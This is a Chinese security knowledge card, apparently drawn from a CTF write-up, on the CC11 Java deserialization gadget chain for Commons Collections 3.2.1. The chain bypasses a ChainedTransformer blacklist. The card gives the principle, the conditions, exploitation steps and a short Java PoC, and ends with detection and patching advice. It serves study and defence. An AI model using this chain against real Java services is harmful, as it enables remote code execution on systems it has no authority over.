---
id: web-java-deserialization-cc11-lazymap-tiedmapentry-templatesimpl-no-chainedtransformer
title: CC11（CommonsCollections 3.2.1）LazyMap+TiedMapEntry+InvokerTransformer 驱动 TemplatesImpl 绕过 ChainedTransformer 黑名单
type: scenario
domain: web
path: web/java/deserialization
technique: cc11-lazymap-templatesimpl
aliases:
- CC11 无 ChainedTransformer
- LazyMap TiedMapEntry TemplatesImpl 链
tags:
- java
- deserialization
- commons-collections
- cc11
- templatesimpl
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-33
  verified_at: '2026-11-08T17:13:38+08:00'
  notes: 已对照原文核对：CC11 PoC与原文逐字一致（LazyMap+TiedMapEntry+InvokerTransformer(getOutputProperties)+ConstantTransformer(null)防本地触发+反射换map），原文明确本地与题目环境均打通；affected_versions原commons-collections 3.2.1为题目依赖清单的环境版本非原文受影响版本声明，已clear；与CC6/CC3组合卡链结构不同（该卡依赖ChainedTransformer/InstantiateTransformer，本卡专绕其黑名单），dedup理由成立
---

## 一句话结论

黑名单禁用 ChainedTransformer 时，可用 CC11 链：HashMap 触发 TiedMapEntry.hashCode → LazyMap.get → InvokerTransformer("getOutputProperties") → TemplatesImpl 字节码执行，全程无需 ChainedTransformer，本地与题目环境实测打通。

## 原理

HashMap.put/反序列化重建时对 key 计算 hash，TiedMapEntry.hashCode 调用 map.get(key)；LazyMap 用工厂 Transformer 惰性填充，工厂设为 InvokerTransformer("getOutputProperties") 即可在传入 TemplatesImpl 对象时触发其 getOutputProperties() → newTransformer() → defineClass 执行 _bytecodes。为避免反序列化前本地 put 阶段就触发，先用 ConstantTransformer(null) 构造 entry 再反射把 LazyMap 字段换成真实带 InvokerTransformer 的 map。该链不出现 ChainedTransformer 类名，可过含 ChainedTransformer 黑名单的 resolveClass 检查。

## 触发条件

- classpath 有 commons-collections 3.x（3.2.1 实测）；
- 反序列化入口未拦截 LazyMap/TiedMapEntry/InvokerTransformer/TemplatesImpl；
- JDK 环境允许 TemplatesImpl 字节码加载（JDK8 实测）。

## 利用步骤

1. 准备 TemplatesImpl（_bytecodes 为恶意 AbstractTranslet 子类，_name、_tfactory 置位）；
2. LazyMap.decorate(new HashMap(), new InvokerTransformer("getOutputProperties", null, null))；
3. 先用 ConstantTransformer(null) 的 LazyMap 构造 TiedMapEntry 并 put 进 HashMap（此时 LazyMap 不触发），随后反射修改 TiedMapEntry.map 字段为第 2 步的真实 LazyMap；
4. 序列化 HashMap 后投递到 /deserialize 等入口触发。

## PoC

```java
Map lazymap = LazyMap.decorate(new HashMap(), new InvokerTransformer("getOutputProperties", null, null));
TiedMapEntry tme = new TiedMapEntry(LazyMap.decorate(new HashMap(), new ConstantTransformer(null)), templatesimpl);
hashMap.put(tme, null);
Field f = TiedMapEntry.class.getDeclaredField("map"); f.setAccessible(true); f.set(tme, lazymap);
```

原文 miniLCTF ezCC（CC3.2.1、黑名单禁 ChainedTransformer 与 jackson）本地实测打通。

## 变体与关联

- CC11 是 CC 链中无需 ChainedTransformer 的经典组合；类似思路还有 CC6（TiedMapEntry+transformer 数组被禁时不可用）改用 InvokerTransformer 单步调用；
- 与两段式 defineClass stub 组合可同时解决长度限制与执行函数黑名单。

## 检测与防御

- 检测：反序列化流中出现 LazyMap/TiedMapEntry/InvokerTransformer/TemplatesImpl 组合告警。
- 防御：升级 commons-collections 至 3.2.2+（反序列化安全模式）或 4.x；入口 resolveClass 白名单。
